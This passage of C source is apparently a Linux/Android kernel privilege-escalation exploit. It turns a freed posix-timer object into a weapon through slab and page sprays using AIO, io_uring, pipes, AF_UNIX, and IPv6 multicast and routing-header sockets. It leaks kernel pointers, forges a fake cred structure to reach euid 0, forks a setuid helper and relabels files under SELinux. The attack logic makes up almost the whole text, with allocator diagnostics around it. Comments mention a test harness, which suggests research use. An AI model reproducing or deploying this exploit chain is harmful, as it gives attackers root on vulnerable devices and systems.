			ic_mcast.nfd, ic_mcast.groups, ic_mcast.made,
			ic_mcast.tail, ic_mcast.err);
	ic_log_sync();
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("post-spray");
		ic_pcp_stat("post-spray");
		ic_slab_stat("post-spray");
		ic_slab_spray_stat("post-spray");
	} else if (getenv("IC_SPRAYDBG")) {
		ic_slab_spray_stat("post-spray");
	}
	if (getenv("IC_PFNDBG") && res.npages) {
		unsigned long k;
		unsigned long lo = 0, hi = 0;

		for (k = 0; k < res.npages; k++) {
			unsigned long long pfn = ic_pagemap_pfn(res.pages[k]);

			if (!pfn)
				continue;
			if (pfn < 0x100000UL)
				lo++;
			else
				hi++;
			if (k < 24 || getenv("IC_PFNALL"))
				fprintf(stderr,
					"[peak] pfn[%lu] va=%p pfn=0x%llx zone=%s\n",
					k, res.pages[k], pfn,
					pfn < 0x100000UL ? "DMA32" : "Normal");
		}
		fprintf(stderr, "[peak] pfn summary DMA32=%lu Normal=%lu\n",
			lo, hi);
	}
	if (getenv("IC_SPRAY_DIAG")) {
		/* Stop before reaping B: B's stale node is still queued, so
		 * letting it exit would rb_erase through whatever page it
		 * landed in and panic.  The allocator stats above already
		 * say which caches consumed order-0 pages during the spray. */
		fprintf(stderr, "[peak] diag stop after spray\n");
		fflush(stderr);
		_exit(0);
	}

	/* Reap B: the stale node now lives in our page.  Run the safe fill
	 * first: if the spray missed, it turns the reap into a safe erase
	 * instead of an rb_erase/warn through a free object. */
	ic_safe_fill();
	ic_sladb("post-fill");
	ic_log_sync();
	if (skbf_min && ic_skb.queued) {
		/* The block is now either in our psl or walled off by the fill;
		 * the remaining order-2 frees can no longer bury it. */
		fprintf(stderr, "[peak] rest flush=%lu\n", ic_skb_flush());
		fflush(stderr);
	}
	fprintf(stderr, "[peak] reaping B\n");
	ic_log_sync();
	if (waitpid(victim_b, &status, 0) != victim_b) {
		fprintf(stderr, "[peak] B reap failed\n");
		goto fail;
	}
	fprintf(stderr, "[peak] B reaped status=0x%x\n", status);

	if (getenv("IC_XCAP") && ic_xcap_scan("post-reap")) {
		/* The slab page that holds the stale node is ours and readable:
		 * the self-write proves X was reclaimed by an order-1 kmalloc-256
		 * slab page.  Nothing after this point can be staged on a page we
		 * cannot map, so park and let the harness power the VM off. */
		fprintf(stderr, "[xcap] CAPTURE slab_page\n");
		fflush(stderr);
		sync();
		reboot(RB_AUTOBOOT);
		for (;;)
			pause();
	}

	if (ic_reap_use_unix()) {
		/* Leak-only validation for the AF_UNIX datagram spray.  The
		 * stale node lives in one queued skb data area; the
		 * RB_CLEAR_NODE() write is read back with recv(MSG_PEEK).  A
		 * datagram that is not the match is consumed (freeing its
		 * data object); the matching one stays queued at its queue
		 * head, because worker 0's base still points at X and the
		 * attempt parks here instead of tearing the sockets down. */
		struct ic_unx_hit uhit;

		if (ic_unx_scan(&uhit)) {
			fprintf(stderr, "[unix] no leak scanned=%lu\n",
				uhit.scanned);
			fflush(stderr);
			goto fail;
		}
		fprintf(stderr,
			"[unix] LEAK x=0x%llx pair=%u off=0x%x hits=%u "
			"obj=0x%llx scanned=%lu\n",
			(unsigned long long)uhit.value, uhit.pair,
			uhit.obj_off, uhit.hits,
			(unsigned long long)(uhit.value & ~0x1fffUL),
			uhit.scanned);
		fflush(stderr);
		sync();
		reboot(RB_AUTOBOOT);
		for (;;)
			pause();
	}

	if (ic_reap_use_rthdr()) {
		/* Leak-only validation for the IPv6 RTHDR slot spray: the
		 * stale node lives inside one socket's kmalloc-512 blob, so
		 * the RB_CLEAR_NODE() write is read back with getsockopt()
		 * instead of from a user mapping.  Nothing after this point
		 * (stage 1 onwards) addresses the node through a user page,
		 * so stop the attempt here. */
		struct ic_rthdr_hit hit;

		ic_rthdr_scan(&hit);
		if (!hit.hits) {
			fprintf(stderr, "[rthdr] no leak (odd=%u)\n",
				hit.odd);
			fflush(stderr);
			goto fail;
		}
		fprintf(stderr,
			"[rthdr] LEAK v=0x%llx sock=%u off=0x%x hits=%u odd=%u"
			" base=0x%llx\n",
			(unsigned long long)hit.value, hit.sock, hit.off,
			hit.hits, hit.odd,
			(unsigned long long)(hit.value & ~0x1ffUL));
		fflush(stderr);
		goto fail;
	}

	if (ic_reap_use_mcast()) {
		/* Leak-only validation for the IPv6 source-list spray: the
		 * stale node lives inside one kmalloc-256 psl and the
		 * RB_CLEAR_NODE() write is read back with getsockopt().  The
		 * object is editable in place afterwards (block/unblock), but
		 * the post-leak stages currently need a user mapping, so stop
		 * the attempt once the capture is proven. */
		struct ic_mcast_hit mhit;

		ic_mcast_scan(&mhit);
		if (!mhit.hits) {
			fprintf(stderr, "[mcast] no leak (odd=%u unsafe=%u)\n",
				mhit.odd, mhit.unsafe);
			fflush(stderr);
			goto fail;
		}
		fprintf(stderr,
			"[mcast] LEAK x=0x%llx sock=%u group=%u off=0x%x hits=%u "
			"odd=%u unsafe=%u base=0x%llx\n",
			(unsigned long long)mhit.value, mhit.sock, mhit.group,
			mhit.off, mhit.hits, mhit.odd, mhit.unsafe,
			(unsigned long long)(mhit.value & ~0x1fffUL));
		fflush(stderr);
		/* From here on X is in a psl page we own: unwinding the attempt
		 * would walk the erased node.  Remember it for the fail path. */
		g_mc.leak = 1;
		if (getenv("IC_MCAST_LEAK")) {
			/* Leak-only mode: the psl is not yet carrying a pattern,
			 * so the attempt could unwind safely -- but a parked
			 * second chain on top of this one is what the harness
			 * must not do, so power the VM off on the oracle. */
			sync();
			reboot(RB_AUTOBOOT);
			for (;;)
				pause();
		}
		if (getenv("IC_PARK_TEST")) {
			/* Validation: bail out with X in the psl, exactly like an
			 * unsupported offset, to exercise the park path. */
			fprintf(stderr, "[peak] park test: bail after the leak\n");
			fflush(stderr);
			goto fail;
		}
		if (ic_mc_chain(&mhit))
			goto fail;
		parked = 1;
		goto peak_cred_ready;
	}

	if (ic_reap_use_pipe() ? ic_pipe_reap_scan(&res) : ic_reap_scan(&res)) {
		fprintf(stderr, "[peak] no leak\n");
		goto fail;
	}
	if (ic_reap_use_pipe()) {
		/* Leak-only: pipe data pages cannot be modified in place, so
		 * nothing after the leak can be staged on them.  This run
		 * exists to prove that an order-0-only spray still lands on
		 * X's freed slab when io_setup()'s slab requests do not run
		 * first.  Park (never exit: B's stale node is gone from the
		 * tree but the attempt's own timers are live) and let the
		 * harness power the VM off. */
		fprintf(stderr,
			"[peak] LEAK x=0x%llx idx=%lu off=0x%x hits=%u (pipe)"
			"\n",
			(unsigned long long)res.leak, res.leak_page,
			res.leak_off, res.hits);
		fflush(stderr);
		/* The oracle harness runs as root; power the VM off so the
		 * outer attempt loop cannot start a second chain on top of
		 * this parked one.  Fall back to parking if reboot fails. */
		sync();
		reboot(RB_AUTOBOOT);
		for (;;)
			pause();
	}
	x = res.leak;
	off = res.leak_off;
	page = res.pages[res.leak_page];
	page_va = x & ~0xfffUL;
	fprintf(stderr, "[peak] LEAK x=0x%llx page=%lu idx=%lu off=0x%x hits=%u"
		" base=0x%llx\n",
		(unsigned long long)x, res.leak_page,
		(unsigned long)(res.leak_page & 3), off, res.hits,
		(unsigned long long)page_va);
	/* The whole fake cred must live in the same 4K page as X: the slot at
	 * 0xff0 straddles into a second page that the spray may not own. */
	if (off + IC_PEAK_CRED_DELTA + IC_PEAK_CRED_SIZE > 0x1000) {
		fprintf(stderr, "[peak] slot straddles block end, retry\n");
		goto fail;
	}
	/* Where the fake user/user_ns/ucounts/group_info live.  With an
	 * order-1 spray (io_uring) the sibling 4K page of the block is ours:
	 * the scan array holds 2 pages per ring in mapping order, so the
	 * sibling is index ^ 1 and its kernel VA is page_va ^ 0x1000.  An
	 * order-0 spray (AIO) mapped only this page, so the fakes go into a
	 * free 0x400 window inside it (IC_INPAGE, also forced when no
	 * sibling exists). */
	if (getenv("IC_INPAGE") || ic_force_inpage ||
	    (res.leak_page ^ 1) >= res.npages) {
		zone_off = ic_peak_zone_off(off);
		if (zone_off == IC_PEAK_ZONE_NONE) {
			fprintf(stderr, "[peak] no in-page zone, retry\n");
			goto fail;
		}
		zone = page;
		zone_va = page_va;
		fprintf(stderr, "[peak] in-page fakes at +0x%x\n", zone_off);
	} else {
		partner = res.pages[res.leak_page ^ 1];
		partner_va = page_va ^ 0x1000;
		zone = partner;
		zone_va = partner_va;
		zone_off = 0;
	}

	/* Trigger timers are created only now: they must not split the slab
	 * that was just reclaimed.  The padding shield is dead weight by now,
	 * and its timers hold sigqueue slots the triggers need. */
	ic_peak_release_pads();
	if (ic_peak_create_triggers()) {
		fprintf(stderr, "[peak] triggers failed\n");
		goto fail;
	}

	/* ---- stage 1: park worker 0's firing loop and leak its task ---- */
	ic_peak_write_stage1(page, off, x);
	ic_peak_fire_triggers();
	for (iter = 0; iter < 400; iter++) {
		uint64_t h = ic_peak_load64(page + off + 0x48);

		if (ic_is_kernel_pointer(h)) {
			winner = h;
			break;
		}
		nanosleep(&poll, NULL);
	}
	if (!winner) {
		fprintf(stderr, "[peak] stage1 no winner (storm or lost)\n");
		goto fail;
	}
	fprintf(stderr, "[peak] stage1 parked winner=0x%llx\n",
		(unsigned long long)winner);
	parked = 1;

	/* Release the stage-1 park; the loop fires (SIGEV_NONE), clears
	 * handling and unlocks.  The real base stays quiet because its
	 * nextevt was left at the huge scratch address. */
	*(volatile uint32_t *)(page + off - 0x58) = 0;
	for (iter = 0; iter < 200; iter++) {
		if (!ic_peak_load64(page + off + 0x48))
			break;
		nanosleep(&poll, NULL);
	}
	if (ic_peak_load64(page + off + 0x48)) {
		fprintf(stderr, "[peak] stage1 loop did not finish\n");
		goto fail;
	}
	/* spin_unlock() of that loop stores 0 last; make sure the stage-2
	 * park value is not overwritten by it (same task, so the second
	 * collect can only start after this unlock anyway). */
	for (iter = 0; iter < 200; iter++) {
		if (!*(volatile uint32_t *)(page + off - 0x58))
			break;
		nanosleep(&poll, NULL);
	}

	/* ---- stage 2: rewrite cred and go quiet ---- */
	ic_peak_write_stage2(page, off, x, winner);
	ic_peak_fire_triggers();

	/* The second collect erases the node from the real base (case 1b
	 * writes X+0x10 into winner->cred) and then parks on it_lock with
	 * handling == winner still visible.  head == 0 is the erase marker. */
	for (iter = 0; iter < 1000; iter++) {
		if (!ic_peak_load64(page + off + 0x20))
			break;
		nanosleep(&poll, NULL);
	}
	if (ic_peak_load64(page + off + 0x20)) {
		fprintf(stderr, "[peak] stage2 collect did not run\n");
		goto fail;
	}
	if (ic_peak_load64(page + off + 0x48) != winner) {
		fprintf(stderr, "[peak] stage2 timing lost handling\n");
		goto fail;
	}
	fprintf(stderr, "[peak] stage2 erased cred=0x%llx pc=0x%llx\n",
		(unsigned long long)(x + IC_PEAK_CRED_DELTA),
		(unsigned long long)ic_peak_load64(page + off));

	/* ---- fake cred while the winner is parked on it_lock ---- */
	{
		/* elist.next/prev (node+0x30/0x38) overlap cred+0x20/0x28 and
		 * the loop's list_del_init() must still see the firing list. */
		uint64_t elist_next = ic_peak_load64(page + off + 0x30);
		uint64_t elist_prev = ic_peak_load64(page + off + 0x38);

		ic_peak_fill_cred(page, off, x, zone, zone_va, zone_off);
		ic_peak_store64(page + off + 0x30, elist_next);
		ic_peak_store64(page + off + 0x38, elist_prev);
	}
	*(volatile uint32_t *)(page + off - 0x58) = 0;	/* release it_lock */
	for (iter = 0; iter < 200; iter++) {
		if (!ic_peak_load64(page + off + 0x48))
			break;
		nanosleep(&poll, NULL);
	}
	if (ic_peak_load64(page + off + 0x48)) {
		fprintf(stderr, "[peak] stage2 loop did not finish\n");
		goto fail;
	}
	/* The loop overwrote parts of the cred (firing -> cap_permitted low
	 * half, list_del_init -> securebits/fsgid/cap_inheritable, handling ->
	 * cap_effective).  Nobody looks at elist any more, so refill it. */
	ic_peak_fill_cred(page, off, x, zone, zone_va, zone_off);
	/* The cached leftmost now points at the fake cred, whose first word
	 * points at itself, so even a fatal signal landing on the winner
	 * makes cleanup_timerqueue() end with an empty base instead of an
	 * rb_next() on garbage. */
peak_cred_ready:
	cred_ready = 1;

	if (g_peak_scan_mode) {
		if (!g_mc.active) {
			/* sec = page + off - 0x20, so sec->sid is the word
			 * at page + off - 0x1c.  Publish it and the fake uid
			 * before the workers are released (the release store
			 * orders them).  The mcast chain already published
			 * both: its psl carries the tsec in block O. */
			g_peak_scan_sid =
				(volatile uint32_t *)(page + off - 0x1c);
			atomic_store_explicit(&g_peak_fake_uid,
					      (unsigned int)((x +
							      IC_PEAK_CRED_DELTA)
							     >> 32),
					      memory_order_relaxed);
		}
		/* execve() refuses a file that is still open for writing. */
		if (g_helper_fd >= 0) {
			close(g_helper_fd);
			g_helper_fd = -1;
		}
		ic_logf("[peak] scan armed sid=0x%llx fake_uid=0x%x "
			"exec=%s%s\n",
			(unsigned long long)(uintptr_t)g_peak_scan_sid,
			atomic_load_explicit(&g_peak_fake_uid,
					     memory_order_relaxed),
			g_peak_scan_exec,
			g_mc.active ? " (sid via psl service)" : "");
		/* Harness-only: load the policy whole (still permissive), then
		 * relabel the payload, prime the shell sid and only then turn
		 * enforcement on.  The superblock only accepts a security
		 * xattr once the policy has set SBLABEL on it, so the label
		 * has to come after the load; while permissive the relabel
		 * check passes.  On the device all of this already holds. */
		if (g_peak_policy_path && *g_peak_policy_path) {
			ic_peak_policy_load(g_peak_policy_path);
			ic_peak_label_exec(g_peak_scan_exec);
			ic_peak_label(g_peak_probe_path, g_peak_probe_label);
			/* Stand-in for /data/adb: a directory whose label the
			 * drop child creates the payload in. */
			if (g_peak_drop_dir && *g_peak_drop_dir) {
				(void)mkdir(g_peak_drop_dir, 0777);
				ic_peak_label(g_peak_drop_dir,
					      "u:object_r:adb_data_file:s0");
			}
			/* Stand-in for /system/bin/sh: a copy of the image that
			 * the mode-4 script names in its shebang. */
			if (g_peak_interp_path && *g_peak_interp_path)
				ic_peak_label(g_peak_interp_path,
					      "u:object_r:system_file:s0");
			ic_peak_intern_contexts(g_peak_scan_ctxs);
			ic_peak_access_file_run(g_peak_access_file);
		}
		if (getenv("IC_SCAN_PRIME"))
			ic_peak_prime_shell();
		if (getenv("IC_SCAN_ENFORCE"))
			ic_peak_enforce_on();
	}

	/* ---- release the workers ---- */
	fprintf(stderr, "[peak] cred filled at 0x%llx, releasing workers\n",
		(unsigned long long)(g_mc.active ? g_mc.cred :
				     x + IC_PEAK_CRED_DELTA));
	atomic_store_explicit(&g_peak_release, 1, memory_order_release);

	/* The stage-1 winner is whichever task happened to run the firing
	 * loop, so it may be this thread rather than one of the workers.
	 * Only the winner's cred was rewritten: check here too, or the
	 * attempt waits two seconds for a worker that will never see euid 0
	 * and then gives up with the psl armed. */
	if (g_peak_fork_helper && !g_peak_scan_mode &&
	    (unsigned int)syscall(SYS_geteuid) == 0)
		ic_peak_fork_helper();

	{
		unsigned int wait_ms = g_peak_scan_mode ? 60000 : 2000;

		for (iter = 0; iter < wait_ms; iter++) {
			if (atomic_load_explicit(&g_poc_success,
						 memory_order_acquire))
				break;
			if (g_mc.active)
				ic_mc_service_sid();
			nanosleep(&poll, NULL);
		}
	}
	if (!atomic_load_explicit(&g_poc_success, memory_order_acquire)) {
		ic_logf("[peak] no setuid helper\n");
		goto fail;
	}
	ic_logf("[peak] SUCCESS helper=%s\n",
		g_peak_scan_mode ? g_peak_scan_exec : g_helper_path);
	if (g_peak_scan_mode)
		ic_peak_report_hit();
	return 0;

fail:
	if (g_mc.active) {
		/* Past P_s1 the psl holds a parked (or released) worker and,
		 * once stage 2 has run, the only copy of the fake cred.  Any
		 * cleanup would either free the cred under the winner or
		 * release_task() it through the rewritten node, so hang the
		 * attempt; the harness times it out. */
		fprintf(stderr, "[mcast] failed with the psl armed, hanging\n");
		fflush(stderr);
		/* Nothing here can reach X any more, and this process will
		 * hold its timers forever: hand the slots back. */
		ic_peak_release_pads();
		for (;;)
			pause();
	}
	if (ic_peak_should_park()) {
		/* Worker 0's base still has the stale node as its cached
		 * leftmost after the candidates were deleted, so exiting walks
		 * it in release_task(): timerqueue_del() warns once (and the
		 * erase then only touches the node's own, already cleared,
		 * fields), which is harmless while panic_on_warn is 0 but a
		 * reboot when it is 1.  A leaked node is worse: its page is a
		 * psl, and exit_files() closes those sockets before
		 * release_task() runs, so the walk reads freed memory.  Park
		 * and let the parent fork a fresh attempt. */
		ic_peak_park_attempt();
		for (;;)
			pause();
	}
	if (parked && !cred_ready) {
		/* A stage-1 winner still holds the stale node as its base's
		 * cached leftmost, with node.parent pointing at a user VA.
		 * Let its parked firing loop finish so it returns to
		 * userspace, wake the other workers out of their spin, and
		 * hang this attempt instead of returning: _exit() would
		 * release_task() the winner through that node and fault.
		 * The parent times the attempt out and forks a fresh one. */
		*(volatile uint32_t *)(page + off - 0x58) = 0;
		atomic_store_explicit(&g_peak_release, 1,
				      memory_order_release);
		fprintf(stderr, "[peak] parked winner left behind, hanging "
			"this attempt\n");
		fflush(stderr);
		for (;;)
			pause();
	}
	ic_peak_delete_candidates();
	for (i = 0; i < g_peak_count; i++) {
		if (g_peak_workers[i].trigger_live) {
			(void)syscall(SYS_timer_delete, g_peak_workers[i].trigger);
			g_peak_workers[i].trigger_live = 0;
		}
	}
	(void)ic_delete_slab_padding(padding);
	(void)ic_delete_flush_timers(flush_ids);
	if (pool)
		free(pool);
	(void)ic_delete_release_range(&release, 0, release.count);
	if (g_drain_count)
		ic_delete_drain_pool();
	ic_rthdr_cleanup();
	ic_mcast_cleanup();
	return -1;
}

static void ic_slab_cache_stat(const char *tag, const char *cache)
{
	static const char *const names[] = {
		"objects", "slabs", "partial", "cpu_slabs",
		"objects_partial", "total_objects", "order", "objs_per_slab"
	};
	char line[384];
	size_t pos = 0;
	unsigned int j;

	if (geteuid() != 0)
		return;
	line[0] = '\0';
	for (j = 0; j < sizeof(names) / sizeof(names[0]); j++) {
		char path[128], val[48];
		int fd;
		ssize_t n, k;

		snprintf(path, sizeof(path), "/sys/kernel/slab/%s/%s", cache,
			 names[j]);
		fd = open(path, O_RDONLY);
		if (fd < 0)
			continue;
		n = read(fd, val, sizeof(val) - 1);
		close(fd);
		if (n <= 0)
			continue;
		val[n] = '\0';
		for (k = 0; k < n; k++)
			if (val[k] == '\n')
				val[k] = '\0';
		pos += (size_t)snprintf(line + pos, sizeof(line) - pos, " %s=%s",
					names[j], val);
		if (pos >= sizeof(line))
			pos = sizeof(line) - 1;
	}
	fprintf(stderr, "[reap] cache@%-9s %s:%s\n", tag, cache, line);
}

static void ic_slab_stat(const char *tag)
{
	ic_slab_cache_stat(tag, "posix_timers_cache");
}

static void ic_slab_spray_stat(const char *tag)
{
	static const char *const caches[] = {
		"vm_area_struct", "filp", "inode_cache", "kioctx",
		"anon_vma", "anon_vma_chain", "maple_node", "dentry",
		"mm_struct", "signal_cache", "sighand_cache", "files_cache",
		"task_struct", "cred_jar",
		"kmalloc-8k", "kmalloc-4k", "kmalloc-2k", "kmalloc-1k",
		"kmalloc-512",
		"kmalloc-256", "kmalloc-192", "kmalloc-128", "kmalloc-96",
		"kmalloc-64", "kmalloc-32", "kmalloc-16", "kmalloc-8",
		"kmalloc-cg-96", "kmalloc-cg-64", "kmalloc-cg-32"
	};
	unsigned int i;

	for (i = 0; i < sizeof(caches) / sizeof(caches[0]); i++)
		ic_slab_cache_stat(tag, caches[i]);
}

static unsigned long ic_memfree_kb(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char line[128];
	unsigned long v = 0;

	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "MemFree: %lu kB", &v) == 1)
			break;
	}
	fclose(f);
	return v;
}

#define IC_PT_TYPES 9
static void ic_pagetype_stat(const char *tag)
{
	static const char *const types[IC_PT_TYPES] = {
		"Unmovable", "Movable", "Reclaimable", "CMA", "HighAtomic",
		"RSCIS", "RSCIB", "ThpPool", "Isolate"
	};
	unsigned long sum[IC_PT_TYPES][11] = { { 0 } };
	unsigned long total[IC_PT_TYPES] = { 0 };
	unsigned long zsum[3][IC_PT_TYPES][11];
	unsigned long ztotal[3][IC_PT_TYPES];
	char line[512];
	FILE *f;
	int in_free = 0;
	int zone_print = getenv("IC_PTZONE") != NULL;

	memset(zsum, 0, sizeof(zsum));
	memset(ztotal, 0, sizeof(ztotal));

	if (geteuid() != 0)
		return;
	f = fopen("/proc/pagetypeinfo", "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		char *p;
		char name[32];
		unsigned int t, o;
		char *q;

		if (strstr(line, "Free pages count per migrate type")) {
			in_free = 1;
			continue;
		}
		if (!in_free)
			continue;
		if (strstr(line, "Number of blocks"))
			break;
		p = strstr(line, ", type");
		if (!p)
			continue;
		p += 6;
		while (*p == ' ' || *p == '\t')
			p++;
		q = name;
		while (*p && *p != ' ' && *p != '\t' && *p != '\n' &&
		       (size_t)(q - name) < sizeof(name) - 1)
			*q++ = *p++;
		*q = '\0';
		{
			const char *pz = strstr(line, "zone");
			int zone = 2;

			if (pz) {
				const char *z = pz + 4;

				while (*z == ' ' || *z == '\t')
					z++;
				if (!strncmp(z, "DMA32", 5))
					zone = 0;
				else if (!strncmp(z, "Normal", 6))
					zone = 1;
			}
			for (t = 0; t < IC_PT_TYPES; t++) {
				if (strcmp(name, types[t]))
					continue;
				for (o = 0; o < 11; o++) {
					unsigned long v;

					while (*p == ' ' || *p == '\t')
						p++;
					if (*p < '0' || *p > '9')
						break;
					v = strtoul(p, &p, 10);
					sum[t][o] += v;
					total[t] += v << o;
					zsum[zone][t][o] += v;
					ztotal[zone][t] += v << o;
				}
				break;
			}
		}
	}
	fclose(f);
	fprintf(stderr,
		"[reap] pt@%-10s: u=%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu tot=%lu m=%lu r=%lu cma=%lu ha=%lu rs=%lu rb=%lu thp=%lu iso=%lu free=%luK\n",
		tag, sum[0][0], sum[0][1], sum[0][2], sum[0][3], sum[0][4],
		sum[0][5], sum[0][6], sum[0][7], sum[0][8], sum[0][9],
		sum[0][10], total[0], total[1], total[2], total[3], total[4],
		total[5], total[6], total[7], total[8], ic_memfree_kb());
	fprintf(stderr,
		"[reap] ptx@%-9s: rs=%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu rb=%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu\n",
		tag, sum[5][0], sum[5][1], sum[5][2], sum[5][3], sum[5][4],
		sum[5][5], sum[5][6], sum[5][7], sum[5][8], sum[5][9],
		sum[5][10], sum[6][0], sum[6][1], sum[6][2], sum[6][3],
		sum[6][4], sum[6][5], sum[6][6], sum[6][7], sum[6][8],
		sum[6][9], sum[6][10]);
	if (getenv("IC_PTVEC")) {
		unsigned int t;

		for (t = 0; t < IC_PT_TYPES; t++)
			fprintf(stderr,
				"[reap] ptv@%-9s %-10s %lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu tot=%lu\n",
				tag, types[t], sum[t][0], sum[t][1], sum[t][2],
				sum[t][3], sum[t][4], sum[t][5], sum[t][6],
				sum[t][7], sum[t][8], sum[t][9], sum[t][10],
				total[t]);
	}
	if (zone_print) {
		static const char *const zn[3] = { "DMA32", "Normal", "other" };
		unsigned int z;

		for (z = 0; z < 3; z++) {
			unsigned int t;

			for (t = 0; t < IC_PT_TYPES; t++)
				if (ztotal[z][t])
					break;
			if (t == IC_PT_TYPES)
				continue;
			fprintf(stderr,
				"[reap] ptz@%-9s %-6s u=%lu(%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu,%lu) m=%lu r=%lu rs=%lu rb=%lu free=%luK\n",
				tag, zn[z], ztotal[z][0],
				zsum[z][0][0], zsum[z][0][1], zsum[z][0][2],
				zsum[z][0][3], zsum[z][0][4], zsum[z][0][5],
				zsum[z][0][6], zsum[z][0][7], zsum[z][0][8],
				zsum[z][0][9], zsum[z][0][10],
				ztotal[z][1], ztotal[z][2], ztotal[z][5],
				ztotal[z][6], ic_memfree_kb());
		}
	}
	fflush(stderr);
}

static void ic_dump_file(const char *path, const char *tag)
{
	int fd = open(path, O_RDONLY);
	char buf[512];
	ssize_t n;

	if (fd < 0) {
		fprintf(stderr, "[dump] %s: open failed\n", path);
		return;
	}
	fprintf(stderr, "[dump] ==== %s begin ====\n", tag);
	while ((n = read(fd, buf, sizeof(buf))) > 0)
		(void)fwrite(buf, 1, (size_t)n, stderr);
	fprintf(stderr, "[dump] ==== %s end ====\n", tag);
	close(fd);
}

/*
 * Per-CPU page-list state straight from /proc/zoneinfo.  This is the
 * ground truth for "where did the freed slab pages go": pages on a pcp
 * list are invisible to /proc/pagetypeinfo but show up in pcp->count.
 */
static void ic_pcp_stat(const char *tag)
{
	char line[256];
	char zone[32] = "?";
	int cpu = -1, count = -1, high = -1, batch = -1;
	FILE *f;

	if (geteuid() != 0)
		return;
	f = fopen("/proc/zoneinfo", "r");
	if (!f)
		return;
	fprintf(stderr, "[reap] pcp@%-10s cur_cpu=%d", tag,
		sched_getcpu());
	while (fgets(line, sizeof(line), f)) {
		char *p;

		p = strstr(line, "zone ");
		if (p && !strstr(line, "pagesets")) {
			char *q = zone;
			p += 5;
			while (*p == ' ')
				p++;
			while (*p && *p != ',' && *p != ' ' && *p != '\n' &&
			       *p != '\r' &&
			       (size_t)(q - zone) < sizeof(zone) - 1)
				*q++ = *p++;
			*q = '\0';
			continue;
		}
		p = strstr(line, "cpu:");
		if (p) {
			sscanf(p + 4, "%d", &cpu);
			count = high = batch = -1;
			continue;
		}
		p = strstr(line, "count:");
		if (p && cpu >= 0) {
			sscanf(p + 6, "%d", &count);
			continue;
		}
		p = strstr(line, "high:");
		if (p && cpu >= 0) {
			sscanf(p + 5, "%d", &high);
			continue;
		}
		p = strstr(line, "batch:");
		if (p && cpu >= 0) {
			sscanf(p + 6, "%d", &batch);
			if (batch >= 0) {
				fprintf(stderr, " %s:c%d=%d/%d/%d", zone, cpu,
					count, high, batch);
				cpu = -1;
			}
		}
	}
	fclose(f);
	fprintf(stderr, "\n");
	fflush(stderr);
}

static void ic_cache_probe(const char *cache)
{
	static const char *const fields[] = { "order", "object_size",
					      "objs_per_slab", "slab_size" };
	unsigned int j;

	if (geteuid() != 0)
		return;
	fprintf(stderr, "[reap] cache %s:", cache);
	for (j = 0; j < sizeof(fields) / sizeof(fields[0]); j++) {
		char path[160], val[64];
		int fd;
		ssize_t n, k;

		snprintf(path, sizeof(path), "/sys/kernel/slab/%s/%s", cache,
			 fields[j]);
		fd = open(path, O_RDONLY);
		if (fd < 0)
			continue;
		n = read(fd, val, sizeof(val) - 1);
		close(fd);
		if (n <= 0)
			continue;
		val[n] = '\0';
		for (k = 0; k < n; k++)
			if (val[k] == '\n')
				val[k] = '\0';
		fprintf(stderr, " %s=%s", fields[j], val);
	}
	fprintf(stderr, "\n");
}

static int ic_reap_attempt(uint64_t target, struct ic_reap_result *res)
{
	struct timespec grace = { .tv_sec = 3 };
	struct timespec aio_grace = { .tv_nsec = 300000000 };
	struct timespec free_grace = { .tv_nsec = 500000000 };
	struct sigevent ev;
	int padding[IC_SLAB_PADDING_TIMERS_MAX];
	int *pool = NULL;
	unsigned int pool_count = 0;
	unsigned int i;
	siginfo_t si;
	pid_t pid;
	int status;

	ic_capture_cpu_map();
	ic_pin_cpu_index(0);
	memset(&g_state, 0, sizeof(g_state));
	memset(padding, 0xff, sizeof(padding));
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;

	ic_slab_stat("start");
	ic_cache_probe("posix_timers_cache");
	ic_cache_probe("kmalloc-2k");
	ic_cache_probe("kmalloc-1k");
	ic_cache_probe("inode_cache");
	ic_cache_probe("kioctx");
	ic_pagetype_stat("start");
	if (ic_create_slab_padding(padding)) {
		fprintf(stderr, "[reap] padding failed\n");
		return -1;
	}
	ic_slab_stat("padding");
	pid = fork();
	if (pid < 0)
		return -1;
	if (!pid)
		ic_run_target();

	if (ic_wait_zombie_without_reap(pid, &si)) {
		fprintf(stderr, "[reap] wait_zombie failed\n");
		return -1;
	}
	fprintf(stderr, "[reap] zombie\n");
	/* Let the call_rcu() free of the victim k_itimer complete. */
	nanosleep(&grace, NULL);
	ic_slab_stat("victim");

	/* Warm the AIO-related slab caches so that the per-context
	 * allocations in io_setup() do not need new slab pages and the
	 * ring page is the only page taken from the buddy.  The pipe spray
	 * needs no slab allocations at spray time, so it just pre-creates
	 * its pipes here (before the pool free) instead. */
	if (ic_reap_use_pipe()) {
		if (getenv("IC_SKBF") && ic_skb_prepare())
			fprintf(stderr, "[reap] skb prepare failed\n");
		if (ic_pipe_prepare())
			fprintf(stderr, "[reap] pipe prepare failed\n");
	} else if (ic_reap_use_packet()) {
		if (ic_packet_prepare())
			fprintf(stderr, "[reap] packet prepare failed\n");
	} else if (ic_reap_use_ioring()) {
		/* io_uring allocates its own blocks; nothing to pre-create. */
		if (getenv("IC_SKBF") && ic_skb_prepare())
			fprintf(stderr, "[reap] skb prepare failed\n");
	} else if (ic_reap_use_perf()) {
		if (getenv("IC_SKBF") && ic_skb_prepare())
			fprintf(stderr, "[reap] skb prepare failed\n");
		if (ic_perf_prepare())
			fprintf(stderr, "[reap] perf prepare failed\n");
	} else {
		fprintf(stderr, "[reap] aio prewarm\n");
		(void)ic_prewarm_aio_allocator();
	}
	ic_slab_stat("prewarm");

	/* Allocate a large pool after the victim free.  Its objects will
	 * reuse the victim's slot and fill every other slot of the slab. */
	pool = malloc(sizeof(int) * (size_t)IC_DRAIN_POOL_TIMERS);
	if (!pool)
		return -1;
	for (i = 0; i < IC_DRAIN_POOL_TIMERS; i++) {
		if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev, &pool[i])) {
			fprintf(stderr, "[reap] pool stopped at %u errno=%d\n",
